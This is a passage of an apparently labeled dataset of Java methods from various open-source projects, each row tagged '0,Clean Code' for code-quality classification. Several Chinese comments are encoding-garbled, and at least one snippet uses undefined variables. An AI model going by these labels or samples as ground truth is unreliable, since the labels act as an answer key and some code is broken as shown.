  user.setUuid(ldapTransformUser.getId());
  user.setCn(ldapTransformUser.getCn());
  user.setDn(ldapTransformUser.getDn());
  user.setUid(ldapTransformUser.getUid());
  user.setOu(String.join("","",ldapTransformUser.getOu()));
  if (StringUtil.isNotEmpty(ldapTransformUser.getEmail())) {
    user.setEmail(ldapTransformUser.getEmail());
  }
  user.setCreatedAt(new Date());
  user.setUpdatedAt(new Date());
  save(user);
  return user;
}
",0,Clean Code
"/** 
 * Reads data from the front of the rolling buffer.
 * @param absolutePosition The absolute position from which data should be read.
 * @param target The buffer into which data should be written.
 * @param length The number of bytes to read.
 */
private void readData(long absolutePosition,ByteBuffer target,int length){
  advanceReadTo(absolutePosition);
  int remaining=length;
  while (remaining > 0) {
    int toCopy=Math.min(remaining,(int)(readAllocationNode.endPosition - absolutePosition));
    Allocation allocation=readAllocationNode.allocation;
    target.put(allocation.data,readAllocationNode.translateOffset(absolutePosition),toCopy);
    remaining-=toCopy;
    absolutePosition+=toCopy;
    if (absolutePosition == readAllocationNode.endPosition) {
      readAllocationNode=readAllocationNode.next;
    }
  }
}
/** 
 * Reads data from the front of the rolling buffer.
 * @param absolutePosition The absolute position from which data should be read.
 * @param target The array into which data should be written.
 * @param length The number of bytes to read.
 */
private void readData(long absolutePosition,byte[] target,int length){
  advanceReadTo(absolutePosition);
  int remaining=length;
  while (remaining > 0) {
    int toCopy=Math.min(remaining,(int)(readAllocationNode.endPosition - absolutePosition));
    Allocation allocation=readAllocationNode.allocation;
    System.arraycopy(allocation.data,readAllocationNode.translateOffset(absolutePosition),target,length - remaining,toCopy);
    remaining-=toCopy;
    absolutePosition+=toCopy;
    if (absolutePosition == readAllocationNode.endPosition) {
      readAllocationNode=readAllocationNode.next;
    }
  }
}",0,Clean Code
"/** 
 * @param schema
 * @param withOption 鏄惁瑙ｆ瀽閫夐」
 * @return 鏈夋暟鎹�
 */
public static List<SurveySchema> flatSurveySchemaWitchOption(SurveySchema schema,boolean withOption){
  List<SurveySchema> dataTypes=new ArrayList<>();
  if (SurveySchema.QuestionType.dataType().contains(schema.getType()) || (withOption && (SurveySchema.QuestionType.Option.equals(schema.getType()) || schema.getType() == null))) {
    SurveySchema dataType=schema.deepCopy();
    dataType.setTitle(trimHtmlTag(schema.getTitle()));
    dataTypes.add(dataType);
  }
  if (schema.getChildren() != null) {
    schema.getChildren().forEach(child -> {
      dataTypes.addAll(flatSurveySchemaWitchOption(child,withOption));
    }
);
  }
  return dataTypes;
}
",0,Clean Code
"public Declare_temporary_table_itemContext declare_temporary_table_item(){
  return getRuleContext(Declare_temporary_table_itemContext.class,0);
}
public final Declare_temporary_table_itemContext declare_temporary_table_item() throws RecognitionException {
  Declare_temporary_table_itemContext _localctx=new Declare_temporary_table_itemContext(_ctx,getState());
  enterRule(_localctx,64,RULE_declare_temporary_table_item);
  int _la;
  try {
    enterOuterAlt(_localctx,1);
{
      setState(836);
      _errHandler.sync(this);
      _la=_input.LA(1);
      if (_la == T_GLOBAL) {
{
          setState(835);
          match(T_GLOBAL);
        }
      }
      setState(838);
      match(T_TEMPORARY);
      setState(839);
      match(T_TABLE);
      setState(840);
      ident();
      setState(842);
      _errHandler.sync(this);
      _la=_input.LA(1);
      if (_la == T_ROW || _la == T_STORED || _la == T_COMMA) {
{
          setState(841);
          create_table_preoptions();
        }
      }
      setState(844);
      create_table_definition();
    }
  }
 catch (  RecognitionException re) {
    _localctx.exception=re;
    _errHandler.reportError(this,re);
    _errHandler.recover(this,re);
  }
 finally {
    exitRule();
  }
  return _localctx;
}",0,Clean Code
"@Override public void onNewStmt(Stmt stmt,JMethod container){
  super.onNewStmt(stmt,container);
  if (stmt instanceof Cast) {
    CastExp castExp=cast.getRValue();
    Var rhs=castExp.getValue();
    if (castExp.getCastType() instanceof ClassType && (!ONLY_APP || (rhs.getMethod().isApplication() && type.getJClass().isApplication()))) {
      casts.put(rhs,type);
    }
  }
}
",0,Clean Code
"@Override public JSONObject convertToJSONObject(Object obj){
  if (obj == null) {
    return new JSONObject();
  }
  JSONObject result=JSONObject.parseObject(JSONObject.toJSONString(obj));
  String queryFieldsStr=result.getString(""queryFields"");
  if (StringUtils.isNotEmpty(queryFieldsStr)) {
    result.put(""queryFields"",JSONArray.parseArray(queryFieldsStr));
  }
  String valueFieldsStr=result.getString(""valueFields"");
  if (StringUtils.isNotEmpty(valueFieldsStr)) {
    result.put(""valueFields"",JSONArray.parseArray(valueFieldsStr));
  }
  String groupFieldsStr=result.getString(""groupFields"");
  if (StringUtils.isNotEmpty(groupFieldsStr)) {
    result.put(""groupFields"",JSONArray.parseArray(groupFieldsStr));
  }
  return result;
}
",0,Clean Code
"private void signDeviceKeystores(){
  if (headersForm.getPsbt().isSigned()) {
    return;
  }
  List<String> fingerprints=headersForm.getSigningWallet().getKeystores().stream().map(keystore -> keystore.getKeyDerivation().getMasterFingerprint()).collect(Collectors.toList());
  List<Device> signingDevices=AppServices.getDevices().stream().filter(device -> fingerprints.contains(device.getFingerprint())).collect(Collectors.toList());
  if (signingDevices.isEmpty() && (headersForm.getSigningWallet().getKeystores().stream().noneMatch(keystore -> keystore.getSource().equals(KeystoreSource.HW_USB) || keystore.getSource().equals(KeystoreSource.SW_WATCH) || keystore.getWalletModel().isCard()) || (headersForm.getSigningWallet().getKeystores().stream().anyMatch(keystore -> keystore.getSource().equals(KeystoreSource.SW_SEED)) && headersForm.getSigningWallet().getKeystores().stream().anyMatch(keystore -> keystore.getSource().equals(KeystoreSource.SW_WATCH))))) {
    return;
  }
  DeviceSignDialog dlg=new DeviceSignDialog(headersForm.getSigningWallet(),fingerprints,headersForm.getPsbt());
  dlg.initOwner(signButton.getScene().getWindow());
  dlg.initModality(Modality.NONE);
  Stage stage=(Stage)dlg.getDialogPane().getScene().getWindow();
  stage.setAlwaysOnTop(true);
  Optional<PSBT> optionalSignedPsbt=dlg.showAndWait();
  if (optionalSignedPsbt.isPresent()) {
    PSBT signedPsbt=optionalSignedPsbt.get();
    headersForm.getPsbt().combine(signedPsbt);
    EventManager.get().post(new PSBTCombinedEvent(headersForm.getPsbt()));
  }
}
",0,Clean Code
"/** 
 * 鐩戞帶娑堟伅闃熷垪
 * @param msg 娑堟伅
 */
@Transactional(rollbackFor=Throwable.class) @RabbitListener(queues=""instantBuy"") @SendTo(""instantBuy"") public String consumeInstantBuy(String msg){
  try {
    String itemId=msg.substring(0,36);
    String userName=msg.substring(36,msg.length());
    Date date=new Date();
    this.instantBuyDao.decreaseItemNum(itemId,date);
    this.instantBuyDao.insertItemSuccess(new InstantBuySuccess(null,itemId,userName,0,date));
    InstantBuyItem item=this.instantBuyDao.selectItem(itemId,date);
    if (item.getNumber() < 0)     throw new MsgException(""鍟嗗搧宸茶绉掓潃瀹�"");
    return msg + ""_SUCCESS"";
  }
 catch (  Exception e) {
    e.printStackTrace();
    return msg + ""_FAIL"";
  }
}",0,Clean Code
"public void setDraft(){
  if (mChatInfo == null) {
    TUIChatLog.e(TAG,""set drafts error :  chatInfo is null"");
    return;
  }
  if (mTextInput == null) {
    TUIChatLog.e(TAG,""set drafts error :  textInput is null"");
    return;
  }
  String draftText=mTextInput.getText().toString();
  if ((isQuoteModel || isReplyModel) && replyPreviewBean != null) {
    Gson gson=new Gson();
    Map<String,String> draftMap=new HashMap<>();
    draftMap.put(""content"",draftText);
    draftMap.put(""reply"",gson.toJson(replyPreviewBean));
    draftText=gson.toJson(draftMap);
  }
  if (presenter != null) {
    presenter.setDraft(draftText);
  }
}
",0,Clean Code
"@Override public void onBindViewHolder(ViewHolder viewHolder,Object item){
  SearchFieldCallback callback=(SearchFieldCallback)item;
  EditText editField=viewHolder.view.findViewById(R.id.simple_edit_value);
  if (editField.getTag() != null) {
    editField.removeTextChangedListener((TextWatcher)editField.getTag());
  }
  editField.setText(callback.getText());
  TextWatcher watcher=new TextWatcher(){
    @Override public void beforeTextChanged(    CharSequence s,    int start,    int count,    int after){
    }
    @Override public void onTextChanged(    CharSequence s,    int start,    int before,    int count){
    }
    @Override public void afterTextChanged(    Editable s){
      callback.onTextChanged(s.toString());
    }
  }
;
  editField.addTextChangedListener(watcher);
  editField.setTag(watcher);
}
",0,Clean Code
"/** 
 * 鑾峰彇group鍘嗗彶娑堣垂鎸囨爣,鎸囧畾鏃堕棿绐楀彛
 */
@PostMapping(""/topic/consumer_offsets/chart/interval"") public RestResponse getOffsetStatsInterval(@RequestBody Map<String,String> queryMap){
  String clusterID=queryMap.get(Constants.KeyStr.CLUSTERID);
  String topic=queryMap.get(BrokerConfig.TOPIC);
  String group=queryMap.get(BrokerConfig.GROUP);
  String type=queryMap.get(Constants.JsonObject.TYPE);
  if (StringUtils.isBlank(clusterID) || StringUtils.isBlank(topic) || StringUtils.isBlank(group)|| StringUtils.isBlank(type)) {
    return ERROR(""clusterID topic group and type must not blank."");
  }
  String start=queryMap.get(Constants.KeyStr.START);
  String end=queryMap.get(Constants.KeyStr.END);
  String interval=queryMap.get(Constants.KeyStr.INTERVAL);
  return SUCCESS_DATA(elasticsearchService.queryDateIntervalOffset(clusterID,topic,group,type,start,end,interval));
}
",0,Clean Code
"@Override public BasePage<Map<String,Object>> forgottenCustomerPageList(BiParams biParams){
  BiAuthority biAuthority=handleDataType(biParams);
  List<Long> userIds=biAuthority.getUserIds();
  if (CollUtil.isEmpty(userIds)) {
    return new BasePage<>();
  }
  Integer day=biParams.getDay();
  List<Long> authUserList=AuthUtil.queryAuthUserList(CrmEnum.CUSTOMER,CrmAuthEnum.LIST);
  authUserList.retainAll(userIds);
  List<Integer> customerIds=crmCustomerService.forgottenCustomer(day,authUserList,biParams.getSearch());
  if (customerIds.size() == 0) {
    return new BasePage<>();
  }
  CrmSearchBO searchBO=new CrmSearchBO();
  searchBO.setPage(biParams.getPage());
  searchBO.setLimit(biParams.getLimit());
  searchBO.setLabel(CrmEnum.CUSTOMER.getType());
  List<String> collect=customerIds.stream().map(Object::toString).collect(Collectors.toList());
  searchBO.setSearchList(Collections.singletonList(new CrmSearchBO.Search(""_id"",""text"",CrmSearchBO.FieldSearchEnum.ID,collect)));
  return crmCustomerService.queryPageList(searchBO);
}",0,Clean Code
"/** 
 * 鑷姩鏍规嵁浜嬩欢娉ㄥ唽 Instance 瀹炰緥
 * @param event 浜嬩欢
 */
@Override public void onApplicationEvent(DeployComponentStateActionLoadedEvent event){
  String key=event.getKey();
  Object bean;
  try {
    bean=context.getBean(event.getBeanName());
  }
 catch (  Exception e) {
    String message=String.format(""cannot get bean now, failed to load action instance|beanName=%s|key=%s"",event.getBeanName(),event.getKey());
    log.error(message);
    throw new AppException(AppErrorCode.UNKNOWN_ERROR,message);
  }
  register(key,(DeployComponentStateAction)bean);
  log.info(""deploy component state action instance {} has registered"",key);
}
",0,Clean Code
"private void initNamespace(Properties properties){
  String namespaceTmp=null;
  String isUseCloudNamespaceParsing=properties.getProperty(PropertyKeyConst.IS_USE_CLOUD_NAMESPACE_PARSING,System.getProperty(SystemPropertyKeyConst.IS_USE_CLOUD_NAMESPACE_PARSING,String.valueOf(Constants.DEFAULT_USE_CLOUD_NAMESPACE_PARSING)));
  if (Boolean.valueOf(isUseCloudNamespaceParsing)) {
    namespaceTmp=TemplateUtils.stringBlankAndThenExecute(namespaceTmp,new Callable<String>(){
      @Override public String call(){
        return TenantUtil.getUserTenantForAcm();
      }
    }
);
    namespaceTmp=TemplateUtils.stringBlankAndThenExecute(namespaceTmp,new Callable<String>(){
      @Override public String call(){
        String namespace=System.getenv(PropertyKeyConst.SystemEnv.ALIBABA_ALIWARE_NAMESPACE);
        return StringUtils.isNotBlank(namespace) ? namespace : EMPTY;
      }
    }
);
  }
  if (StringUtils.isBlank(namespaceTmp)) {
    namespaceTmp=properties.getProperty(PropertyKeyConst.NAMESPACE);
  }
  namespace=StringUtils.isNotBlank(namespaceTmp) ? namespaceTmp.trim() : EMPTY;
  properties.put(PropertyKeyConst.NAMESPACE,namespace);
}
",0,Clean Code
"private void updateRows(String channelId){
  if (channelId == null) {
    return;
  }
  Log.d(TAG,""updateRows: Start loading..."");
  getView().showProgressBar(true);
  Observable<List<MediaGroup>> channelObserve=obtainChannelObservable(channelId);
  mUpdateAction=channelObserve.subscribe(this::updateRows,error -> {
    Log.e(TAG,""updateRows error: %s"",error.getMessage());
    getView().showProgressBar(false);
  }
);
}
public void updateRows(List<MediaGroup> mediaGroups){
  if (getView() == null) {
    disposeActions();
    mChannelId=null;
    mPendingGroups.add(mediaGroups);
    return;
  }
  if (GeneralData.instance(getContext()).isOldChannelLookEnabled()) {
    moveToTopIfNeeded(mediaGroups);
  }
  for (  MediaGroup mediaGroup : mediaGroups) {
    if (mediaGroup.getMediaItems() == null) {
      Log.e(TAG,""updateRowsHeader: MediaGroup is empty. Group Name: "" + mediaGroup.getTitle());
      continue;
    }
    VideoGroup group=VideoGroup.from(mediaGroup);
    getView().update(group);
    mDeArrowProcessor.process(group);
  }
  getView().showProgressBar(false);
}
",0,Clean Code
"@GetMapping(""/get-detail"") @Operation(summary=""鑾峰緱绉掓潃娲诲姩鏄庣粏"") @Parameter(name=""id"",description=""娲诲姩缂栧彿"",required=true,example=""1024"") public CommonResult<AppSeckillActivityDetailRespVO> getSeckillActivity(@RequestParam(""id"") Long id){
  SeckillActivityDO activity=activityService.getSeckillActivity(id);
  if (activity == null || ObjectUtil.equal(activity.getStatus(),CommonStatusEnum.DISABLE.getStatus())) {
    return success(null);
  }
  List<SeckillConfigDO> configs=configService.getSeckillConfigListByStatus(CommonStatusEnum.ENABLE.getStatus());
  configs.removeIf(config -> !CollUtil.contains(activity.getConfigIds(),config.getId()));
  SeckillConfigDO config=findFirst(configs,config0 -> isBetween(config0.getStartTime(),config0.getEndTime()));
  if (config == null) {
    config=CollUtil.getLast(configs);
  }
  if (config == null) {
    return null;
  }
  LocalDate nowDate;
  if (LocalDateTimeUtils.isBetween(activity.getStartTime(),activity.getEndTime())) {
    nowDate=LocalDate.now();
  }
 else {
    nowDate=activity.getEndTime().toLocalDate();
  }
  LocalDateTime startTime=LocalDateTime.of(nowDate,LocalTime.parse(config.getStartTime()));
  LocalDateTime endTime=LocalDateTime.of(nowDate,LocalTime.parse(config.getEndTime()));
  List<SeckillProductDO> productList=activityService.getSeckillProductListByActivityId(activity.getId());
  return success(SeckillActivityConvert.INSTANCE.convert3(activity,productList,startTime,endTime));
}",0,Clean Code
"public void deleteMessages(final List<Integer> positions){
  if (!safetyCall() || positions == null || positions.isEmpty()) {
    TUIChatLog.w(TAG,""deleteMessages unSafetyCall"");
    return;
  }
  List<TUIMessageBean> msgs=new ArrayList<>();
  for (int i=0; i < positions.size(); i++) {
    msgs.add(loadedMessageInfoList.get(positions.get(i)));
  }
  provider.deleteMessages(msgs,new IUIKitCallback<Void>(){
    @Override public void onSuccess(    Void data){
      onMessageListDeleted(msgs);
    }
    @Override public void onError(    String module,    int errCode,    String errMsg){
    }
  }
);
}",0,Clean Code
"public void createMediaThumbs(){
  if (isVideo()) {
    TLRPC.Document document=getDocument();
    TLRPC.PhotoSize thumb=FileLoader.getClosestPhotoSizeWithSize(document.thumbs,50);
    TLRPC.PhotoSize qualityThumb=FileLoader.getClosestPhotoSizeWithSize(document.thumbs,320);
    mediaThumb=ImageLocation.getForDocument(qualityThumb,document);
    mediaSmallThumb=ImageLocation.getForDocument(thumb,document);
  }
 else   if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaPhoto && getMedia(messageOwner).photo != null && !photoThumbs.isEmpty()) {
    TLRPC.PhotoSize currentPhotoObjectThumb=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,50);
    TLRPC.PhotoSize currentPhotoObject=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,320,false,currentPhotoObjectThumb,false);
    mediaThumb=ImageLocation.getForObject(currentPhotoObject,photoThumbsObject);
    mediaSmallThumb=ImageLocation.getForObject(currentPhotoObjectThumb,photoThumbsObject);
  }
}",0,Clean Code
"public List<String> getDenyListPackages(){
  List<String> result=new ArrayList<>();
  if (!getApi().equals(""Zygisk""))   return result;
  if (!ConfigFileManager.magiskDbPath.exists())   return result;
  try (final SQLiteDatabase magiskDb=SQLiteDatabase.openDatabase(ConfigFileManager.magiskDbPath,new SQLiteDatabase.OpenParams.Builder().addOpenFlags(SQLiteDatabase.OPEN_READONLY).build())){
    try (Cursor cursor=magiskDb.query(""settings"",new String[]{""value""},""`key`=?"",new String[]{""denylist""},null,null,null)){
      if (!cursor.moveToNext())       return result;
      int valueIndex=cursor.getColumnIndex(""value"");
      if (valueIndex >= 0 && cursor.getInt(valueIndex) == 0)       return result;
    }
     try (Cursor cursor=magiskDb.query(true,""denylist"",new String[]{""package_name""},null,null,null,null,null,null,null)){
      if (cursor == null)       return result;
      int packageNameIdx=cursor.getColumnIndex(""package_name"");
      while (cursor.moveToNext()) {
        result.add(cursor.getString(packageNameIdx));
      }
      return result;
    }
   }
 catch (  Throwable e) {
    Log.e(TAG,""get denylist"",e);
  }
  return result;
}",0,Clean Code
"private void loadFailed(){
  if (loadedFailed || loadingFailed) {
    return;
  }
  loadingFailed=true;
  loadInternal(true,loadedDrafts -> {
    final long now=System.currentTimeMillis();
    ArrayList<Long> ids=new ArrayList<>();
    ArrayList<StoryEntry> deleteEntries=new ArrayList<>();
    ArrayList<StoryEntry> appendEntries=new ArrayList<>();
    for (int i=0; i < loadedDrafts.size(); ++i) {
      StoryEntry entry=loadedDrafts.get(i).toEntry();
      if (entry == null) {
        continue;
      }
      if (entry.file == null || !entry.file.exists() || now - entry.draftDate > EXPIRATION_PERIOD) {
        deleteEntries.add(entry);
      }
 else {
        appendEntries.add(entry);
        ids.add(entry.draftId);
      }
    }
    delete(deleteEntries);
    loadingFailed=false;
    loadedFailed=true;
    MessagesController.getInstance(currentAccount).getStoriesController().putUploadingDrafts(appendEntries);
  }
);
}",0,Clean Code
"/** 
 * Commits the chosen word to the text field and saves it for later retrieval.
 * @param settingsValues the current values of the settings.
 * @param chosenWord the word we want to commit.
 * @param commitType the type of the commit, as one of LastComposedWord.COMMIT_TYPE_
 * @param separatorString the separator that's causing the commit, or NOT_A_SEPARATOR if none.
 */
private void commitChosenWord(final SettingsValues settingsValues,final String chosenWord,final int commitType,final String separatorString){
  long startTimeMillis=0;
  if (DebugFlags.DEBUG_ENABLED) {
    startTimeMillis=System.currentTimeMillis();
    Log.d(TAG,""commitChosenWord() : ["" + chosenWord + ""]"");
  }
  if (DebugFlags.DEBUG_ENABLED) {
    long runTimeMillis=System.currentTimeMillis() - startTimeMillis;
    Log.d(TAG,""commitChosenWord() : "" + runTimeMillis + "" ms to run ""+ ""SuggestionSpanUtils.getTextWithSuggestionSpan()"");
    startTimeMillis=System.currentTimeMillis();
  }
  final NgramContext ngramContext=mConnection.getNgramContextFromNthPreviousWord(settingsValues.mSpacingAndPunctuations,mWordComposer.isComposingWord() ? 2 : 1);
  if (DebugFlags.DEBUG_ENABLED) {
    long runTimeMillis=System.currentTimeMillis() - startTimeMillis;
    Log.d(TAG,""commitChosenWord() : "" + runTimeMillis + "" ms to run ""+ ""Connection.getNgramContextFromNthPreviousWord()"");
    Log.d(TAG,""commitChosenWord() : NgramContext = "" + ngramContext);
    startTimeMillis=System.currentTimeMillis();
  }
  mConnection.commitText(chosenWord,1);
  if (DebugFlags.DEBUG_ENABLED) {
    long runTimeMillis=System.currentTimeMillis() - startTimeMillis;
    Log.d(TAG,""commitChosenWord() : "" + runTimeMillis + "" ms to run ""+ ""Connection.commitText"");
    startTimeMillis=System.currentTimeMillis();
  }
  performAdditionToUserHistoryDictionary(settingsValues,chosenWord,ngramContext);
  if (DebugFlags.DEBUG_ENABLED) {
    long runTimeMillis=System.currentTimeMillis() - startTimeMillis;
    Log.d(TAG,""commitChosenWord() : "" + runTimeMillis + "" ms to run ""+ ""performAdditionToUserHistoryDictionary()"");
    startTimeMillis=System.currentTimeMillis();
  }
  mLastComposedWord=mWordComposer.commitWord(commitType,chosenWord,separatorString,ngramContext);
  if (DebugFlags.DEBUG_ENABLED) {
    long runTimeMillis=System.currentTimeMillis() - startTimeMillis;
    Log.d(TAG,""commitChosenWord() : "" + runTimeMillis + "" ms to run ""+ ""WordComposer.commitWord()"");
  }
}",0,Clean Code
"/** 
 * @param initialization A {@link RangedUri} corresponding to initialization data, if such dataexists.
 * @param timescale The timescale in units per second.
 * @param presentationTimeOffset The presentation time offset. The value in seconds is thedivision of this value and  {@code timescale}.
 * @param indexStart The byte offset of the index data in the segment.
 * @param indexLength The length of the index data in bytes.
 */
public SingleSegmentBase(RangedUri initialization,long timescale,long presentationTimeOffset,long indexStart,long indexLength){
  super(initialization,timescale,presentationTimeOffset);
  this.indexStart=indexStart;
  this.indexLength=indexLength;
}
public SingleSegmentBase(){
  this(null,1,0,0,0);
}",0,Clean Code
"private void testExecuteUpload(S3FileClientConfig config) throws Exception {
  ValidationUtils.validate(Validation.buildDefaultValidatorFactory().getValidator(),config);
  S3FileClient client=new S3FileClient(0L,config);
  client.init();
  String path=IdUtil.fastSimpleUUID() + "".jpg"";
  byte[] content=ResourceUtil.readBytes(""file/erweima.jpg"");
  String fullPath=client.upload(content,path,""image/jpeg"");
  System.out.println(""璁块棶鍦板潃锛�"" + fullPath);
  if (true) {
    byte[] bytes=client.getContent(path);
    System.out.println(""鏂囦欢鍐呭锛�"" + bytes.length);
  }
  if (false) {
    client.delete(path);
  }
}",0,Clean Code
"public OAuth2Response requestAccessToken() throws IOException {
  if (this.grantType == null) {
    this.grantType=OAuth2Constant.GRANT_TYPE_PASSWORD;
  }
  return OAuth2Access.getToken(this);
}
public void requestAccessToken(final OAuth2ResponseCallback callback){
  new Thread(() -> {
    OAuth2Response response;
    try {
      response=requestAccessToken();
      callback.onResponse(response);
    }
 catch (    Exception e) {
      response=new OAuth2Response(e);
      callback.onResponse(response);
    }
  }
).start();
}",0,Clean Code
"@Override public boolean onPrepareActionMode(ActionMode mode,Menu menu){
  if (selectedView != null) {
    CharSequence charSequence=getText(selectedView,false);
    if (multiselect || selectionStart <= 0 && selectionEnd >= charSequence.length() - 1) {
      menu.getItem(1).setVisible(false);
    }
 else {
      menu.getItem(1).setVisible(true);
    }
    menu.getItem(2).setVisible(selectedView instanceof View);
  }
  return true;
}
@Override public boolean onPrepareActionMode(ActionMode mode,Menu menu){
  return callback.onPrepareActionMode(mode,menu);
}",0,Clean Code
"private Long getLock(Long dataSourceId,String databaseName,String schemaName,TableCacheVersionDO versionDO){
  String key=getTableKey(dataSourceId,databaseName,schemaName);
  if (versionDO == null) {
    versionDO=new TableCacheVersionDO();
    versionDO.setDatabaseName(databaseName);
    versionDO.setSchemaName(schemaName);
    versionDO.setDataSourceId(dataSourceId);
    versionDO.setStatus(""2"");
    versionDO.setKey(key);
    versionDO.setVersion(0L);
    versionDO.setTableCount(0L);
    try {
      getVersionMapper().insert(versionDO);
      return 0L;
    }
 catch (    Exception e) {
      e.printStackTrace();
      return -1L;
    }
  }
 else {
    long version=versionDO.getVersion() + 1;
    LambdaQueryWrapper<TableCacheVersionDO> queryWrapper=new LambdaQueryWrapper();
    queryWrapper.eq(TableCacheVersionDO::getId,versionDO.getId());
    queryWrapper.eq(TableCacheVersionDO::getVersion,versionDO.getVersion());
    versionDO.setVersion(version);
    versionDO.setStatus(""2"");
    int n=getVersionMapper().update(versionDO,queryWrapper);
    if (n == 1) {
      return version;
    }
 else {
      return -1L;
    }
  }
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public Long createPurchaseReturn(ErpPurchaseReturnSaveReqVO createReqVO){
  ErpPurchaseOrderDO purchaseOrder=purchaseOrderService.validatePurchaseOrder(createReqVO.getOrderId());
  List<ErpPurchaseReturnItemDO> purchaseReturnItems=validatePurchaseReturnItems(createReqVO.getItems());
  accountService.validateAccount(createReqVO.getAccountId());
  String no=noRedisDAO.generate(ErpNoRedisDAO.PURCHASE_RETURN_NO_PREFIX);
  if (purchaseReturnMapper.selectByNo(no) != null) {
    throw exception(PURCHASE_RETURN_NO_EXISTS);
  }
  ErpPurchaseReturnDO purchaseReturn=BeanUtils.toBean(createReqVO,ErpPurchaseReturnDO.class,in -> in.setNo(no).setStatus(ErpAuditStatus.PROCESS.getStatus())).setOrderNo(purchaseOrder.getNo()).setSupplierId(purchaseOrder.getSupplierId());
  calculateTotalPrice(purchaseReturn,purchaseReturnItems);
  purchaseReturnMapper.insert(purchaseReturn);
  purchaseReturnItems.forEach(o -> o.setReturnId(purchaseReturn.getId()));
  purchaseReturnItemMapper.insertBatch(purchaseReturnItems);
  updatePurchaseOrderReturnCount(createReqVO.getOrderId());
  return purchaseReturn.getId();
}
",0,Clean Code
"/** 
 * Adds a field to the embed.
 * @param name Name of the field.
 * @param value Content of the field.
 * @param inline Whether to inline the field or not.
 * @return {@link MessageEmbedBuilder} for chaining.
 */
public MessageEmbedBuilder addField(String name,String value,boolean inline){
  return addField(createField(name,value,inline));
}
/** 
 * Adds a field to the embed.
 * @param field {@link EmbedField}
 * @return {@link MessageEmbedBuilder} for chaining.
 * @see MessageEmbedBuilder#addField(String,String,boolean)
 * @see MessageEmbedBuilder#createField(String,String,Boolean)
 */
@SuppressWarnings(""unchecked"") public MessageEmbedBuilder addField(EmbedField field){
  if (field != null)   try {
    List<EmbedField> o=(List<EmbedField>)fieldsField.get(embed);
    if (o == null)     fieldsField.set(embed,Collections.singletonList(field));
 else {
      ArrayList<EmbedField> aList=(o instanceof ArrayList ? (ArrayList<EmbedField>)o : new ArrayList<>(o));
      aList.add(field);
      fieldsField.set(embed,aList);
    }
  }
 catch (  Throwable e) {
    Main.logger.error(e);
  }
  return this;
}
",0,Clean Code
"private DataSource hiveDataSource(){
  String url=DWSConfig.HIVE_META_URL.getValue();
  String username=DWSConfig.HIVE_META_USER.getValue();
  String password=DWSConfig.HIVE_META_PASSWORD.getValue();
  if (StringUtils.isBlank(url) || StringUtils.isBlank(username) || StringUtils.isBlank(password)) {
    org.apache.hadoop.conf.Configuration hiveConf=HiveUtils.getDefaultConf(HadoopConf.HADOOP_ROOT_USER().getValue());
    logger.info(""from hive conf to pares meta store JDBC url"");
    url=hiveConf.get(""javax.jdo.option.ConnectionURL"");
    username=hiveConf.get(""javax.jdo.option.ConnectionUserName"");
    password=hiveConf.get(""javax.jdo.option.ConnectionPassword"");
    if (DWSConfig.HIVE_PASS_ENCODE_ENABLED.getValue()) {
      logger.info(""hive meta password is encode "");
      password=HiveUtils.decode(password);
    }
  }
  return DataSourceUtils.buildDataSource(url,username,password);
}
",0,Clean Code
"private void completeTask(String taskUuid){
  Map<String,Set<String>> map=TaskCenter.resultMap.get(taskUuid);
  List<Object> failedReq=TaskCenter.failCreateMap.get(taskUuid);
  TaskCheckpointDtoBuilder builder=TaskCheckpointDto.builder().taskUUID(taskUuid).data(genCheckpointData(taskUuid));
  if (CollectionUtils.isEmpty(map.get(""error"")) && CollectionUtils.isEmpty(failedReq)) {
    builder.status(""success"");
  }
 else {
    builder.status(""failed"").code(""PartialFailed"").message(""some task of taskplatform failed!"");
  }
  String url=UrlUtil.buildUrl(aispProperties.getUrl().concat(""/updateTaskRecord""));
  log.info(""action=cleanTask || taskUUID: {}"",taskUuid);
  TaskCenter.cleanTask(taskUuid);
  try {
    Response response=RequestUtil.postRaw(url,null,JSONObject.toJSONString(builder.build()),null);
    if (response.isSuccessful()) {
      log.info(""action=completeTask || taskUUID:"" + taskUuid + "" Success!"");
    }
 else {
      log.warn(""action=completeTask || complete task failed! message:{}"",response.message());
    }
  }
 catch (  IOException e) {
    log.error(""action=completeTask || internal error, complete task failed!"",e);
  }
}
",0,Clean Code
"/** 
 * 鏂板鍏朵粬cluster IP锛屼笉浼氭敹鍒伴�氱煡
 * @throws Exception
 */
@Test public void subscribeOtherCluster() throws Exception {
  String serviceName=randomDomainName();
  naming.subscribe(serviceName,Arrays.asList(""c2""),new EventListener(){
    int index=0;
    @Override public void onEvent(    Event event){
      if (index == 0) {
        index++;
        return;
      }
      System.out.println(((NamingEvent)event).getServiceName());
      System.out.println(((NamingEvent)event).getInstances());
      instances=((NamingEvent)event).getInstances();
    }
  }
);
  naming.registerInstance(serviceName,""1.1.1.1"",TEST_PORT,""c1"");
  int i=0;
  while (instances.isEmpty()) {
    Thread.sleep(1000L);
    if (i++ > 10) {
      return;
    }
  }
  Assert.fail();
}",0,Clean Code
"@SuppressLint(""NotifyDataSetChanged"") private void initPage(int position){
  if (mList != null && mList.size() > paginationSize && canPagination) {
    indexPage=position / pageSize + 1;
  }
  doNotScroll=true;
  if (mPaginationIndicator != null) {
    mPaginationIndicator.skip2Pos(indexPage);
  }
  mRecyclerView.scrollToPosition(listIndexInPage(position));
}",0,Clean Code
"@RequestMapping(value=""/services"",method=RequestMethod.GET) public Object listDetail(HttpServletRequest request){
  boolean withInstances=Boolean.parseBoolean(WebUtils.optional(request,""withInstances"",""true""));
  if (withInstances) {
    String namespaceId=WebUtils.optional(request,CommonParams.NAMESPACE_ID,Constants.DEFAULT_NAMESPACE_ID);
    List<ServiceDetailInfo> serviceDetailInfoList=new ArrayList<>();
    int pageNo=Integer.parseInt(WebUtils.required(request,""pageNo""));
    int pageSize=Integer.parseInt(WebUtils.required(request,""pageSize""));
    String keyword=WebUtils.optional(request,""keyword"",StringUtils.EMPTY);
    List<Service> serviceList=new ArrayList<>(8);
    serviceManager.getPagedService(namespaceId,pageNo,pageSize,keyword,StringUtils.EMPTY,serviceList,false);
    for (    Service service : serviceList) {
      ServiceDetailInfo serviceDetailInfo=new ServiceDetailInfo();
      serviceDetailInfo.setServiceName(NamingUtils.getServiceName(service.getName()));
      serviceDetailInfo.setGroupName(NamingUtils.getGroupName(service.getName()));
      serviceDetailInfo.setMetadata(service.getMetadata());
